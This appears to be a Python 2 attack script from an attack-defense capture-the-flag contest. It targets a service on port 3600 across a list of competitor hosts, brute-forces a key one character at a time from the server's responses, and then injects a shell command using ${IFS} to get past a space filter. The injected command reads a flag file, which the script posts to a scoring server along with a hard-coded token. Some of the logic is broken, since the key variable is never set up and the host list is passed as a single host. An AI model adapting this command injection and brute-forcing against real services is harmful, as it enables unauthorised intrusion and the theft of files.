import socket
import struct
import time
import telnetlib
import string
import sys

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

port = 3600

def submit(flag):
    import requests
    import json
    token = "WRr7S6DHrH7tuF4F"

    url = 'http://10.10.10.10/submit'
    headers = {'content-type': 'application/json'}
    postData = { 'flag': flag.replace(' ','').replace('\n', ''), 'token': token }
    print postData
    r = requests.post(url, data = json.dumps(postData), headers=headers)
    print r.text

def baoju(host):
    for x in string.printable:
        time.sleep(0.1)
        global key
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        f = s.makefile('rw', bufsize=0)
        readuntil(f, 'peek?\n')
        f.write('0\n')
        readuntil(f, '== ?\n')

        i = 0
        while (i < len(key)):
            f.write(key[i:i+2])
            readuntil(f, '== ?\n')
            i += 2

        skey = x + '\n'
        f.write(skey)
        res = f.read(6)

        if "Acces" in res:
            #t = telnetlib.Telnet()
            #t.sock = s
            #t.interact()
            readuntil(f, 'here:')
            f.write('3;cat${IFS}/home/flags/secret-guard/flag\n')
            #f.write(';\n')
            ttt = f.read(64)
            submit(ttt.replace('\n',''))
            return 1

        if "Wro" in res:
            continue
        else:
            key += (x + '\n')
            #print key
            break
    return 0

hosts = [
'10.10.0.2',
'10.10.1.2',
'10.10.2.2',
'10.10.3.2',
'10.10.4.2',
'10.10.6.2',
'10.10.7.2',
'10.10.8.2',
]

port = 3600

from multiprocessing.dummy import Pool as ThreadPool

def pwn(hosts):
    key = ''
    while (True):
        if baoju(hosts) == 1:
            break

#pool = ThreadPool(4)
#results = pool.map(pwn, hosts)
#pool.close()
#pool.join()
#t = telnetlib.Telnet()
#t.sock = s
#t.interact()
